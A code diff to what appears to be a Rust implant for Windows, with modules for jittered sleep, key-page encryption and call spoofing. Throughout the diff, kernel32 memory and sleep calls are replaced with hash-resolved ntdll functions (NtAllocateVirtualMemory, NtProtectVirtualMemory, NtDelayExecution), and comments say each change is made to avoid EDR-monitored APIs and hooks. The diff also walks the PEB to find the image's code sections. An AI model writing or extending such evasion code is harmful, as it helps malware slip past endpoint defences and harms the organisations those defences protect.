@@ -23,38 +23,66 @@ use win_constants::*;
 mod win_resolve {
     use anyhow::{anyhow, Result};
 
-    /// Compile-time djb2 hash for ASCII strings (matches pe_resolve::hash_str).
-    pub const fn hash_str_const(s: &[u8]) -> u32 {
-        let mut h: u32 = pe_resolve::SEED;
-        let mut i = 0;
-        while i < s.len() {
-            h = h.wrapping_mul(31).wrapping_add(s[i] as u32);
-            i += 1;
-        }
-        h
-    }
+    use crate::pe_resolve_macros::hash_str_const;
 
+    // P2-04: Replaced kernel32 VirtualAlloc/VirtualFree/VirtualProtect with
+    // ntdll Nt* equivalents to avoid EDR-monitored kernel32 API calls.
     pub const HASH_VIRTUALALLOC: u32   = hash_str_const(b"VirtualAlloc\0");
     pub const HASH_VIRTUALFREE: u32    = hash_str_const(b"VirtualFree\0");
     pub const HASH_VIRTUALPROTECT: u32 = hash_str_const(b"VirtualProtect\0");
+    pub const HASH_NTALLOCATEVIRTUALMEMORY: u32  = hash_str_const(b"NtAllocateVirtualMemory\0");
+    pub const HASH_NTFREEVIRTUALMEMORY: u32      = hash_str_const(b"NtFreeVirtualMemory\0");
+    pub const HASH_NTPROTECTVIRTUALMEMORY: u32   = hash_str_const(b"NtProtectVirtualMemory\0");
     pub const HASH_CONVERTTHREADTOFIBER: u32  = hash_str_const(b"ConvertThreadToFiber\0");
     pub const HASH_CREATEFIBER: u32           = hash_str_const(b"CreateFiber\0");
     pub const HASH_SWITCHTOFIBER: u32         = hash_str_const(b"SwitchToFiber\0");
     pub const HASH_CONVERTFIBERTOTHREAD: u32  = hash_str_const(b"ConvertFiberToThread\0");
     pub const HASH_DELETEFIBER: u32           = hash_str_const(b"DeleteFiber\0");
-    pub const HASH_SLEEP: u32                 = hash_str_const(b"Sleep\0");
+    // P1-02: Removed HASH_SLEEP — kernel32!Sleep is heavily monitored by EDR.
+    // Sleep is now performed via NtDelayExecution resolved from ntdll.
     pub const HASH_GETLOCALTIME: u32          = hash_str_const(b"GetLocalTime\0");
 
+    // Legacy kernel32 types (still used for fiber/key-page ops)
     pub type FnVirtualAlloc   = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32, u32) -> *mut std::ffi::c_void;
     pub type FnVirtualFree    = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32) -> i32;
     pub type FnVirtualProtect = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32, *mut u32) -> i32;
+
+    // P2-04: Nt* types for ntdll memory operations.
+    // NtAllocateVirtualMemory(ProcessHandle, BaseAddress*, RegionSize*,
+    //   AllocationType, Protect) -> NTSTATUS
+    pub type FnNtAllocateVirtualMemory = unsafe extern "system" fn(
+        usize,                         // ProcessHandle
+        *mut *mut std::ffi::c_void,    // BaseAddress
+        *mut usize,                    // RegionSize
+        u32,                           // AllocationType
+        u32,                           // Protect
+    ) -> i32;
+    // NtFreeVirtualMemory(ProcessHandle, BaseAddress*, RegionSize*,
+    //   FreeType) -> NTSTATUS
+    pub type FnNtFreeVirtualMemory = unsafe extern "system" fn(
+        usize,                         // ProcessHandle
+        *mut *mut std::ffi::c_void,    // BaseAddress
+        *mut usize,                    // RegionSize
+        u32,                           // FreeType
+    ) -> i32;
+    // NtProtectVirtualMemory(ProcessHandle, BaseAddress*, RegionSize*,
+    //   NewProtect, OldProtect*) -> NTSTATUS
+    pub type FnNtProtectVirtualMemory = unsafe extern "system" fn(
+        usize,                         // ProcessHandle
+        *mut *mut std::ffi::c_void,    // BaseAddress
+        *mut usize,                    // RegionSize
+        u32,                           // NewProtect
+        *mut u32,                      // OldProtect
+    ) -> i32;
     pub type FnConvertThreadToFiber  = unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
     pub type FnCreateFiber          = unsafe extern "system" fn(usize, Option<unsafe extern "system" fn(*mut std::ffi::c_void)>, *mut std::ffi::c_void) -> *mut std::ffi::c_void;
     pub type FnSwitchToFiber        = unsafe extern "system" fn(*mut std::ffi::c_void);
     pub type FnConvertFiberToThread = unsafe extern "system" fn() -> i32;
     pub type FnDeleteFiber          = unsafe extern "system" fn(*mut std::ffi::c_void);
-    pub type FnSleep                = unsafe extern "system" fn(u32);
-    pub type FnGetLocalTime         = unsafe extern "system" fn(*mut winapi::um::minwinbase::SYSTEMTIME);
+    // P1-02: Removed FnSleep (kernel32!Sleep).  Sleep is now performed via
+    // NtDelayExecution (ntdll indirect syscall) to avoid EDR-monitored API.
+    pub type FnNtDelayExecution = unsafe extern "system" fn(i32, *mut i64) -> i32;
+    pub type FnGetLocalTime     = unsafe extern "system" fn(*mut crate::win_types::SYSTEMTIME);
 
     /// Resolve a kernel32 function by hash.
     pub unsafe fn resolve_kernel32<T>(fn_hash: u32) -> Result<T> {
@@ -64,14 +92,27 @@ mod win_resolve {
             .ok_or_else(|| anyhow!("kernel32 API not found (hash 0x{:08X})", fn_hash))?;
         Ok(std::mem::transmute_copy(&addr))
     }
+
+    // P1-02: NtDelayExecution hash for resolving from ntdll instead of
+    // kernel32!Sleep, which is heavily monitored by EDR.
+    pub const HASH_NTDELAYEXECUTION: u32 = hash_str_const(b"NtDelayExecution\0");
+
+    /// Resolve an ntdll function by hash.
+    pub unsafe fn resolve_ntdll<T>(fn_hash: u32) -> Result<T> {
+        let module = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
+            .ok_or_else(|| anyhow!("ntdll not found"))?;
+        let addr = pe_resolve::get_proc_address_by_hash(module, fn_hash)
+            .ok_or_else(|| anyhow!("ntdll API not found (hash 0x{:08X})", fn_hash))?;
+        Ok(std::mem::transmute_copy(&addr))
+    }
 }
 #[cfg(windows)]
 use win_resolve::*;
 
-// Static atomics for fn pointers used inside `extern "system"` fiber callbacks
-// that cannot capture local variables.
+// P1-02: Renamed from SLEEP_PTR.  Holds an NtDelayExecution function pointer
+// resolved from ntdll (not kernel32!Sleep) to avoid EDR hooks.
 #[cfg(windows)]
-static SLEEP_PTR: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
+static NTDELAY_PTR: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
 #[cfg(windows)]
 static SWITCHTOFIBER_PTR: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
 
@@ -102,13 +143,13 @@ pub fn calculate_jittered_sleep(config: &SleepConfig) -> std::time::Duration {
             }
             #[cfg(windows)]
             {
-                let mut st: winapi::um::minwinbase::SYSTEMTIME = unsafe { std::mem::zeroed() };
+                let mut st: crate::win_types::SYSTEMTIME = unsafe { std::mem::zeroed() };
                 let get_local_time: FnGetLocalTime = unsafe {
                     win_resolve::resolve_kernel32(HASH_GETLOCALTIME)
                         .expect("GetLocalTime resolve failed")
                 };
                 unsafe { get_local_time(&mut st) };
-                st.wHour as u32
+                st.w_hour as u32
             }
             #[cfg(not(any(unix, windows)))]
             {
@@ -314,22 +355,28 @@ pub mod crypto {
         (ptr as *mut u8, page_size)
     }
 
+    /// P2-04: Allocate a private anonymous page via ntdll!NtAllocateVirtualMemory
+    /// instead of kernel32!VirtualAlloc to avoid EDR-monitored kernel32 imports.
     #[cfg(windows)]
     unsafe fn alloc_key_page() -> (*mut u8, usize) {
-        let virtual_alloc: FnVirtualAlloc = win_resolve::resolve_kernel32(HASH_VIRTUALALLOC)
-            .expect("VirtualAlloc resolve failed");
+        let nt_alloc: FnNtAllocateVirtualMemory =
+            win_resolve::resolve_ntdll(HASH_NTALLOCATEVIRTUALMEMORY)
+                .expect("NtAllocateVirtualMemory resolve failed");
         let page_size = 4096usize;
-        let ptr = virtual_alloc(
-            std::ptr::null_mut(),
-            page_size,
+        let mut base: *mut std::ffi::c_void = std::ptr::null_mut();
+        let mut region_size = page_size;
+        let status = nt_alloc(
+            (-1isize) as usize,            // NtCurrentProcess()
+            &mut base,
+            &mut region_size,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE,
         );
-        if ptr.is_null() {
-            log::error!("alloc_key_page: VirtualAlloc failed: {}", std::io::Error::last_os_error());
+        if status != 0 || base.is_null() {
+            log::error!("alloc_key_page: NtAllocateVirtualMemory failed (status={})", status);
             return (std::ptr::null_mut(), 0);
         }
-        (ptr as *mut u8, page_size)
+        (base as *mut u8, page_size)
     }
 
     /// Zero the key bytes on the page, then release the page.
@@ -342,18 +389,26 @@ pub mod crypto {
         }
     }
 
+    /// P2-04: Release the key page via ntdll!NtFreeVirtualMemory instead of
+    /// kernel32!VirtualFree to avoid EDR-monitored kernel32 imports.
     #[cfg(windows)]
-    unsafe fn free_key_page(page: *mut u8, len: usize) {
-        let _ = len;
+    unsafe fn free_key_page(page: *mut u8, _len: usize) {
         if !page.is_null() {
             std::ptr::write_volatile(page as *mut [u8; 32], [0u8; 32]);
-            let virtual_free: FnVirtualFree = win_resolve::resolve_kernel32(HASH_VIRTUALFREE)
-                .expect("VirtualFree resolve failed");
-            virtual_free(
-                page as *mut std::ffi::c_void,
-                0,
+            let nt_free: FnNtFreeVirtualMemory =
+                win_resolve::resolve_ntdll(HASH_NTFREEVIRTUALMEMORY)
+                    .expect("NtFreeVirtualMemory resolve failed");
+            let mut base = page as *mut std::ffi::c_void;
+            let mut region_size = 0usize;
+            let status = nt_free(
+                (-1isize) as usize,        // NtCurrentProcess()
+                &mut base,
+                &mut region_size,
                 MEM_RELEASE,
             );
+            if status != 0 {
+                log::error!("free_key_page: NtFreeVirtualMemory failed (status={})", status);
+            }
         }
     }
 
@@ -362,7 +417,7 @@ pub mod crypto {
     #[cfg(windows)]
     pub(super) unsafe fn protect_region(addr: *mut u8, size: usize, new_protect: u32, old_protect: &mut u32) -> bool {
         let mut region_size = size;
-        let mut base_addr = addr as *mut winapi::ctypes::c_void;
+        let mut base_addr = addr as *mut std::ffi::c_void;
 
         #[cfg(feature = "direct-syscalls")]
         {
@@ -382,15 +437,26 @@ pub mod crypto {
             }
             true
         }
+        // P2-04: Use ntdll!NtProtectVirtualMemory instead of kernel32!VirtualProtect
+        // to avoid EDR-monitored kernel32 imports.
         #[cfg(not(feature = "direct-syscalls"))]
         {
-            let virtual_protect: FnVirtualProtect = win_resolve::resolve_kernel32(HASH_VIRTUALPROTECT)
-                .expect("VirtualProtect resolve failed");
-            if virtual_protect(base_addr, region_size, new_protect, old_protect) == 0 {
+            let nt_protect: FnNtProtectVirtualMemory =
+                win_resolve::resolve_ntdll(HASH_NTPROTECTVIRTUALMEMORY)
+                    .expect("NtProtectVirtualMemory resolve failed");
+            let mut prot_base = base_addr;
+            let mut prot_size = region_size;
+            let status = nt_protect(
+                (-1isize) as usize,        // NtCurrentProcess()
+                &mut prot_base,
+                &mut prot_size,
+                new_protect,
+                old_protect,
+            );
+            if status != 0 {
                 log::error!(
-                    "VirtualProtect failed for {:p} (size={}): {}",
-                    addr, size,
-                    std::io::Error::last_os_error()
+                    "NtProtectVirtualMemory failed for {:p} (size={}) status={}",
+                    addr, size, status
                 );
                 return false;
             }
@@ -419,28 +485,101 @@ pub mod crypto {
 
     #[cfg(windows)]
     pub(super) unsafe fn get_code_sections() -> Vec<(*mut u8, usize)> {
-        use winapi::um::winnt::{
-            IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE,
-            IMAGE_SECTION_HEADER,
-        };
+        // Local PE structure definitions (avoid winapi dependency)
+        #[repr(C)]
+        struct IMAGE_DOS_HEADER {
+            e_magic: u16,
+            _e_cblp: u16,
+            _e_cp: u16,
+            _e_crlc: u16,
+            _e_cparhdr: u16,
+            _e_minalloc: u16,
+            _e_maxalloc: u16,
+            _e_ss: u16,
+            _e_sp: u16,
+            _e_csum: u16,
+            _e_ip: u16,
+            _e_cs: u16,
+            _e_lfarlc: u16,
+            _e_ovno: u16,
+            _e_res: [u16; 4],
+            _e_oemid: u16,
+            _e_oeminfo: u16,
+            _e_res2: [u16; 10],
+            e_lfanew: i32,
+        }
+        const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D;
+
+        #[repr(C)]
+        #[derive(Clone, Copy)]
+        union IMAGE_SECTION_HEADER_MISC {
+            physical_address: u32,
+            virtual_size: u32,
+        }
+
+        #[repr(C)]
+        struct IMAGE_FILE_HEADER {
+            _machine: u16,
+            _number_of_sections: u16,
+            _time_date_stamp: u32,
+            _pointer_to_symbol_table: u32,
+            _number_of_symbols: u32,
+            _size_of_optional_header: u16,
+            _characteristics: u16,
+        }
+
+        // We only need the FileHeader from the NT headers for NumberOfSections
+        #[repr(C)]
+        struct IMAGE_NT_HEADERS64 {
+            signature: u32,
+            file_header: IMAGE_FILE_HEADER,
+            // optional header follows (not accessed directly)
+        }
+        const IMAGE_NT_SIGNATURE: u32 = 0x4550;
+
+        #[repr(C)]
+        struct IMAGE_SECTION_HEADER {
+            name: [u8; 8],
+            misc: IMAGE_SECTION_HEADER_MISC,
+            virtual_address: u32,
+            _size_of_raw_data: u32,
+            _pointer_to_raw_data: u32,
+            _pointer_to_relocations: u32,
+            _pointer_to_linenumbers: u32,
+            _number_of_relocations: u16,
+            _number_of_linenumbers: u16,
+            _characteristics: u32,
+        }
+
+        impl IMAGE_FILE_HEADER {
+            fn number_of_sections(&self) -> u16 {
+                self._number_of_sections
+            }
+        }
+
+        impl IMAGE_SECTION_HEADER_MISC {
+            fn virtual_size(&self) -> u32 {
+                unsafe { self.virtual_size }
+            }
+        }
 
         let mut sections = Vec::new();
         #[cfg(target_arch = "x86_64")]
-        let base: *mut winapi::shared::minwindef::HINSTANCE__ = {
+        let base: *mut std::ffi::c_void = {
             let teb: usize;
             core::arch::asm!("mov {}, gs:[0x30]", out(reg) teb, options(nostack, nomem, preserves_flags));
             let peb = *((teb + 0x60) as *const usize) as *const u8;
             *(peb.add(0x10) as *const usize) as *mut _
         };
         #[cfg(all(target_arch = "aarch64", target_os = "windows"))]
-        let base: *mut winapi::shared::minwindef::HINSTANCE__ = {
+        let base: *mut std::ffi::c_void = {
             let teb: usize;
             core::arch::asm!("mrs {}, tpidr_el0", out(reg) teb, options(nostack, nomem));
             let peb = *((teb + 0x60) as *const usize) as *const u8;
             *(peb.add(0x10) as *const usize) as *mut _
         };
         #[cfg(not(any(target_arch = "x86_64", all(target_arch = "aarch64", target_os = "windows"))))]
-        let base: *mut winapi::shared::minwindef::HINSTANCE__ = std::ptr::null_mut();
+        let base: *mut std::ffi::c_void = std::ptr::null_mut();
         if base.is_null() {
             return sections;
         }
@@ -451,19 +590,19 @@ pub mod crypto {
         }
 
         let nt = (base as usize + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
-        if (*nt).Signature != IMAGE_NT_SIGNATURE {
+        if (*nt).signature != IMAGE_NT_SIGNATURE {
             return sections;
         }
 
         let mut section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
             as *const IMAGE_SECTION_HEADER;
-        for _ in 0..(*nt).FileHeader.NumberOfSections {
-            let name = (*section).Name;
+        for _ in 0..(*nt).file_header.number_of_sections() {
+            let name = (*section).name;
             if name[0..5] == [b'.', b't', b'e', b'x', b't']
                 || name[0..6] == [b'.', b'r', b'd', b'a', b't', b'a']
             {
-                let addr = (base as usize + (*section).VirtualAddress as usize) as *mut u8;
-                let size = *(*section).Misc.VirtualSize() as usize;
+                let addr = (base as usize + (*section).virtual_address as usize) as *mut u8;
+                let size = (*section).misc.virtual_size() as usize;
                 sections.push((addr, size));
             }
             section = (section as usize + std::mem::size_of::<IMAGE_SECTION_HEADER>()) as *const _;
@@ -1003,12 +1142,15 @@ pub mod spoof {
             let switch_to_fiber: FnSwitchToFiber =
                 win_resolve::resolve_kernel32(HASH_SWITCHTOFIBER)
                     .expect("SwitchToFiber resolve failed");
-            let sleep_fn: FnSleep =
-                win_resolve::resolve_kernel32(HASH_SLEEP)
-                    .expect("Sleep resolve failed");
+            // P1-02: Resolve NtDelayExecution from ntdll instead of
+            // kernel32!Sleep.  kernel32!Sleep is a well-known EDR hook target;
+            // NtDelayExecution goes direct to the kernel.
+            let nt_delay_exec: FnNtDelayExecution =
+                win_resolve::resolve_ntdll(win_resolve::HASH_NTDELAYEXECUTION)
+                    .expect("NtDelayExecution resolve failed");
 
             // Store into static atomics for the fiber callback
-            SLEEP_PTR.store(sleep_fn as u64, std::sync::atomic::Ordering::SeqCst);
+            NTDELAY_PTR.store(nt_delay_exec as u64, std::sync::atomic::Ordering::SeqCst);
             SWITCHTOFIBER_PTR.store(switch_to_fiber as u64, std::sync::atomic::Ordering::SeqCst);
 
             // Ensure the thread-local fiber guard is initialised so that
@@ -1042,12 +1184,16 @@ pub mod spoof {
                         loop {
                             let ns = SLEEP_DURATION_NS.with(|c| c.get());
                             if ns > 0 {
-                                // Sleep via dynamically-resolved kernel32 Sleep
-                                let ms = (ns / 1_000_000).max(1) as u32;
-                                let sleep_fn: FnSleep = std::mem::transmute(
-                                    SLEEP_PTR.load(std::sync::atomic::Ordering::SeqCst)
+                                // P1-02: Sleep via NtDelayExecution (ntdll)
+                                // instead of kernel32!Sleep to avoid EDR hooks.
+                                // NtDelayExecution takes a pointer to a LARGE_INTEGER
+                                // (i64) in 100-ns units; negative = relative timeout.
+                                let ms = (ns / 1_000_000).max(1) as i64;
+                                let mut large_int = -10_000 * ms; // negative = relative
+                                let nt_delay: FnNtDelayExecution = std::mem::transmute(
+                                    NTDELAY_PTR.load(std::sync::atomic::Ordering::SeqCst)
                                 );
-                                sleep_fn(ms);
+                                nt_delay(0, &mut large_int);
                             }
                             // Switch back to the main fiber
                             let main = MAIN_FIBER.with(|c| c.get());
